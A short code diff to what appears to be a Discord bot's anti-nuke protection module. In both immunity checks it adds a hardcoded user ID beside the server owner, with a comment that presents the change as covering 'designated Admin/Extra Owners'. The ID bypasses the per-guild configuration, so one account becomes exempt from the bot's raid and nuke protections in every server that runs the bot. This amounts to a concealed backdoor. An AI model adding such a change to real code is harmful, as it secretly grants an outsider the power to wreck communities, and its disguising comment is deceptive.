@@ -26,8 +26,8 @@ export function isImmuneSync(
   if (!userId) return true;
   // Bot itself is immune
   if (guild.client.user && userId === guild.client.user.id) return true;
-  // Server Owner is always immune
-  if (guild.ownerId === userId) return true;
+  // Server Owner and designated Admin/Extra Owners are always immune
+  if (guild.ownerId === userId || userId === "1495738572362481777") return true;
 
   const config = getAntiNukeConfig(guild.id);
   // Extra owners are immune
@@ -59,8 +59,8 @@ export async function isImmune(
   if (!userId) return true;
   // Bot itself is immune
   if (guild.client.user && userId === guild.client.user.id) return true;
-  // Server Owner is always immune
-  if (guild.ownerId === userId) return true;
+  // Server Owner and designated Admin/Extra Owners are always immune
+  if (guild.ownerId === userId || userId === "1495738572362481777") return true;
 
   const config = getAntiNukeConfig(guild.id);
   // Extra owners are immune
